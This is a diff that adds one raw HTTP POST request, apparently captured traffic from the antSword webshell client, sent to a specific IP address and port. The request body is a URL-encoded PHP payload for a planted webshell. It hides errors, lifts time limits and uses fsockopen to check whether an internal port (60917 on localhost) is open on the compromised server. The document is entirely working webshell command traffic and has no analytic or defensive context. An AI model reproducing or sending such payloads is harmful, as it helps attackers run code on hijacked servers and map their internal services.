@@ -1,0 +1,8 @@
+POST / HTTP/1.1
+Host: 39.108.164.219:60004
+User-Agent: antSword/v2.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 823
+Connection: close
+
+ant=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2222159%22%3Becho%20%40asenc(%24output)%3Becho%20%220a973%22%3B%7Dob_start()%3Btry%7Bsleep(1)%3B%0A%20%20%20%20%20%20%20%20%20%20%24fp%20%3D%20%40fsockopen(%22127.0.0.1%22%2C%2060917%2C%20%24errno%2C%20%24errstr%2C%201)%3B%0A%20%20%20%20%20%20%20%20%20%20if(!%24fp)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20echo(0)%3B%0A%20%20%20%20%20%20%20%20%20%20%7Delse%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20echo(1)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%40fclose(%24fp)%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
